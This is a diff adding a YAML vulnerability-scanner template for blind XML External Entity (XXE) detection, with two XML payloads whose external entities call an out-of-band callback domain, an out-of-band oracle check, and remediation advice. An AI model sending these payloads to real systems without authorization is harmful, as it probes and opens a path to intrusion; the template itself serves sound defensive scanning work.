@@ -1,0 +1,19 @@
+id: xxe-oob
+name: XML External Entity (blind, OAST-confirmed)
+family: xxe
+severity: high
+cwe: CWE-611
+owasp: WSTG-INPV-07
+inject_into: [body, json]
+payloads:
+  - "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://{{oast_domain}}/\">]><r>&x;</r>"
+  - "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % x SYSTEM \"http://{{oast_domain}}/\"> %x;]><r/>"
+oracle:
+  type: any_of
+  checks:
+    - type: oob
+confirm_reproducible: false
+remediation: >-
+  Disable external entity and DTD processing in the XML parser (set
+  FEATURE_SECURE_PROCESSING, disallow-doctype-decl, and disable external
+  general/parameter entities). Prefer a parser configured to reject DOCTYPE.
